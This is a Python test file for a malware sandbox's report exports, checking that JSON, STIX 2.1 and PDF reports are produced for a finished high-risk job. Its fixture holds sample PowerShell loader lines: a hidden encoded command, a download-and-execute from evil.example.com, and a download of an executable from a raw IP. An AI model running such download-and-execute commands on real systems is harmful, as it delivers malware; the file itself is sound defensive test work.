"""Report rendering: JSON, STIX 2.1, and PDF are all views of a finished job."""
from __future__ import annotations

from app.engine import pipeline
from app.engine import report as report_mod
from app.engine.models import JobStatus, SandboxJob
from app.engine.storage import store_bytes

_MALICIOUS = (
    b"powershell -w hidden -EncodedCommand aQBlAHgA\n"
    b"IEX ((New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1'))\n"
    b"$c.DownloadFile('http://185.100.87.202/p.exe', 'C:\\Temp\\p.exe')\n"
)


def _completed_high_risk_job(db) -> SandboxJob:
    stored = store_bytes(_MALICIOUS)
    job = pipeline.new_job(db, stored, original_name="loader.ps1", tenant="default")
    db.commit()
    pipeline.run(db, job)
    db.commit()
    assert job.status == JobStatus.COMPLETED
    assert job.risk_level in ("high", "critical")
    return job


def test_json_report_has_the_documented_keys(db):
    job = _completed_high_risk_job(db)
    report = report_mod.as_json(job)

    # The brief-mandated schema keys.
    for key in (
        "job_id",
        "filename",
        "sha256",
        "mime",
        "yara_hits",
        "macros",
        "behaviors",
        "ai_score",
        "final_score",
        "risk_level",
    ):
        assert key in report, f"missing documented key {key!r}"

    assert report["job_id"] == job.public_id
    assert report["sha256"] == job.sha256
    assert report["risk_level"] == job.risk_level
    assert isinstance(report["yara_hits"], list)
    assert isinstance(report["behaviors"], list)
    # The full forensic payload rides alongside the brief schema.
    assert "iocs" in report and "tiers" in report and "signals" in report
    assert report["schema"] == "cyclowareness-sandbox.report/1"


def test_stix_export_is_a_bundle_with_objects(db):
    job = _completed_high_risk_job(db)
    bundle = report_mod.as_stix(job)

    assert bundle["type"] == "bundle"
    assert isinstance(bundle["objects"], list) and bundle["objects"]

    types = {obj["type"] for obj in bundle["objects"]}
    # A file observable is always present; a high-risk verdict names malware and
    # emits indicators for the extracted network IOCs.
    assert "file" in types
    assert "indicator" in types
    assert "malware" in types

    # Every object round-trips as valid STIX (the id shape is spec-defined).
    for obj in bundle["objects"]:
        assert "id" in obj and "--" in obj["id"]


def test_pdf_export_is_non_empty_and_well_formed(db):
    job = _completed_high_risk_job(db)
    pdf = report_mod.as_pdf(job)

    assert isinstance(pdf, (bytes, bytearray))
    assert pdf[:5] == b"%PDF-"
    assert len(pdf) > 1000  # a real multi-page document, not a stub
    assert b"%%EOF" in pdf[-1024:]
